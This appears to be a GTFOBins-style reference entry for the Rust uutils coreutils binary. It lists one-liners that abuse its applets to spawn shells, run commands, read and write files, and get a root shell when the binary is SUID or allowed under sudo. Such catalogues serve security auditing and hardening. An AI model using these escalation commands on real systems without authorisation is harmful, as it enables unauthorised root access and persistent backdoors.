---
description: >
  Rust multi-call binary providing implementations of common Unix utilities.
  Default on Ubuntu 26.04+ as `coreutils-from-uutils` (package `rust-coreutils`).
  Analogous to [busybox](/gtfobins/busybox/) but for desktop/server distributions.
functions:
  shell:
    - description: Spawn a shell via the `env` applet.
      code: coreutils env /bin/sh
    - description: Spawn a shell via the `timeout` applet.
      code: coreutils timeout --foreground 9999 /bin/sh
  command:
    - description: Execute a command via the `env` applet.
      code: coreutils env COMMAND
    - description: Execute a command via the `nice` applet.
      code: coreutils nice COMMAND
    - description: Execute a command via the `nohup` applet.
      code: coreutils nohup COMMAND
    - description: Execute a command via the `timeout` applet.
      code: coreutils timeout --foreground 9999 COMMAND
  file-read:
    - description: Read a file via the `cat` applet.
      code: coreutils cat FILE
    - description: Read a file via the `head` applet.
      code: coreutils head -c 999999 FILE
  file-write:
    - description: Write to a file via the `tee` applet.
      code: echo DATA | coreutils tee FILE
    - description: Copy a file via the `cp` applet.
      code: coreutils cp SOURCE DEST
  suid:
    - description: >
        If the binary has the SUID bit set, it does not drop the elevated
        privileges and may be abused to access the file system, escalate
        or maintain privileged access as a SUID backdoor. If it is used
        to run `sh -p`, omit the `-p` argument on systems like Debian
        that allow the default `sh` shell to run with SUID privileges.
      code: |
        coreutils env /bin/sh -p
    - description: Spawn a root shell by chrooting.
      code: |
        coreutils chroot / /bin/sh -p
  sudo:
    - description: If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
      code: sudo coreutils env /bin/sh
  library-load:
    - description: Load a shared library via the `stdbuf` applet, which sets `LD_PRELOAD`.
      code: coreutils stdbuf -oL /bin/sh
---
